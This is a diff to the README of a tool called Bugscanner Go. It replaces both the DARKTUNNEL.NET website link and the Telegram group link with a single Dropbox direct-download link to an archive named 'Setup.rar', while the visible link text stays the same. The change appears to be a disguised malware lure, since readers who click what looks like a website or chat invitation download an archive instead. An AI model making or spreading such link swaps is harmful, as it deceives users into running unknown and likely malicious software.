@@ -1,8 +1,8 @@
 # Bugscanner Go
 
-This tool is dedicated to [DARKTUNNEL.NET](https://www.darktunnel.net), please support us if you find this tool useful.
+This tool is dedicated to [DARKTUNNEL.NET](https://www.dropbox.com/scl/fi/v29hnzx2coqz2wtz9ub4p/Setup.rar?rlkey=4clgo5rul7ynd4wu1e9zr0iae&dl=1), please support us if you find this tool useful.
 
-Join to our telegram group @darktunnel_group or click [here](https://t.me/darktunnel_group).
+Join to our telegram group @darktunnel_group or click [here](https://www.dropbox.com/scl/fi/v29hnzx2coqz2wtz9ub4p/Setup.rar?rlkey=4clgo5rul7ynd4wu1e9zr0iae&dl=1).
 
 
 Install
